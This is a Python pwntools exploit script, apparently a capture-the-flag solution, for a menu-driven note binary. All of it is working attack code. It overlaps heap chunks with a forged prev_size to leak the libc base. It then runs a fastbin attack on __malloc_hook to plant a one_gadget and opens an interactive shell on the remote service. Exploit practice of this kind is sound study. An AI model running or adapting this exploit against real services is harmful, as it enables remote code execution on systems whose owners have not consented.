from pwn import *
context.terminal=["tmux","splitw","-h"]
elf=ELF("./pwn")
a=""
def debug():
    gdb.attach(a,'''
    b *(0x555555554000+0x000000000000F20)
    b *(0x555555554000+0x000000000001046)
    b *(0x555555554000+0x0000000000010E8)
    ''')
def menu(idx):
    a.recvuntil("choice> ")
    a.sendline(str(idx))
def add(size,content):
    menu(1)
    a.recvuntil("length> ")
    a.sendline(str(size))
    a.recvuntil("content> ")
    a.send(content)
def delete(idx):
    menu(3)
    a.recvuntil("index> ")
    a.sendline(str(idx))
def show(idx):
    menu(2)
    a.recvuntil("index> ")
    a.sendline(str(idx))
def exp(ip,port):
    global a
    local = 0
    if local :
        a=process("./pwn")
    else:
        a=remote(ip,port)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    add(0x98,'A'*0x90+'\n')#0
    #debug()
    add(0x68,'A\n')#1
    add(0x68,'A\n')#2
    add(0xf8,'A\n')#3
    add(0x88,'A\n')#4
    add(0x18,'A\n')#5
    delete(2)
    #debug()
    add(0x68,'A'*0x60+p64(0x150+0x50-0x20))#1
    
    delete(0)
    delete(3)
    add(0x98,'A\n')#0
    #debug()
    show(1)
    libc_base=u64(a.recv(6).ljust(8,'\x00'))-libc.symbols["__malloc_hook"]-0x10-88
    success("libc_base ==> 0x%x"%libc_base)
    
    delete(2)
    __malloc_hook=libc.symbols["__malloc_hook"]+libc_base
    add(0xe0-8,'A'*0x68+p64(0x71)+p64(__malloc_hook-0x23)+'\n')#2

    add(0x68,'A'*0x69)
    
    one=libc_base+0xf1147
    add(0x68,'A'*0x13+p64(one)+'\n')
    menu(1)
    a.recvuntil("length> ")
    a.sendline(str(10))
    
    a.interactive()


    

    

if __name__ == "__main__":

    exp("127.0.0.1",8888)

    

